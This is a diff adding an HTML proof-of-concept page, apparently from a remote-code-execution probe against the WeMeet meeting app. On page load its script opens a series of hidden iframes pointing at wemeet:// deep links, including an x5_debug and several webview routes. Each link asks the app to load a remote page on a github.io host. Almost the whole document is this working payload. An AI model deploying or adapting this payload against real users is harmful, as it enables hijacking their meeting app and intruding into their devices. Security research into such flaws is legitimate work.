@@ -1,0 +1,26 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P17</h1>
+<script>
+document.title='P17L-START';
+var x5='https://gitwhs.github.io/wm-poc-rce/probe17x5.html';
+var schemes=[
+  'wemeet://page/profile/aboutus/x5_debug?url='+encodeURIComponent(x5),
+  'wemeet://page/lobby/webview?url='+encodeURIComponent(x5),
+  'wemeet://page/activity/webview?url='+encodeURIComponent(x5),
+  'wemeet://page/ads/ads_page?url='+encodeURIComponent(x5),
+  'wemeet://page/inmeeting/setting/facebeauty_web?url='+encodeURIComponent(x5)
+];
+var i=0;
+function fire(){
+  if(i>=schemes.length){ document.title='P17L-DONE-IFRAMES'; return; }
+  var s=schemes[i++];
+  document.title='P17L-IFRAME-'+i;
+  var f=document.createElement('iframe');
+  f.src=s;
+  document.body.appendChild(f);
+  setTimeout(fire, 2800);
+}
+setTimeout(fire, 600);
+</script>
+</body></html>
